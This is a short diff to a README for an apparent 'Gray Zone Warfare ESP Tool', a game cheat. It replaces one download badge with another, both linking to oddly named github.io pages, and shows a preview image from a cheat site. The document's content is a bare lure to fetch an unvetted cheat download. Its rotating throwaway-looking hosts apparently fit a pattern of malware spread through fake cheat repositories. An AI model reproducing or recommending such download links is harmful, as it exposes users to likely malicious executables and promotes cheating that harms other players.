@@ -4,7 +4,8 @@
 
 <h1 align="center">🎯 Gray Zone Warfare ESP Tool</h1>
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://atafafakec57.github.io/.github/gray-zone-warfare-tool)
+[![GET Gray Zone](https://img.shields.io/badge/GET%20%E2%80%94%20Gray-Zone-0078D6?style=for-the-badge&logoColor=white)](https://sarahandersony301.github.io/.github/Gray-Zone)
+
 
 <p align="center">
   <img src="https://www.skycheats.com/uploads/monthly_2024_07/2(2).webp.94229b2cdfaa3914a526d2814459d12a.webp" alt="Gray Zone Warfare ESP Tool Preview" width="800" />
